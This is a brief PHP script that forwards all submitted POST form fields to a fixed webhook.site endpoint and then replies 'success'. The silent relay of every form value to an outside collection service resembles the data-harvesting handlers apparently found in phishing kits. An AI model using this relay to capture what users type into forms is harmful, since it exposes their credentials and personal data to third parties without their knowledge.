<?php

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://webhook.site/699a57c5-679e-42ba-a94d-ca0595ec55c6");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 100);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
curl_exec($ch);
curl_close($ch);

echo 'success';
?>
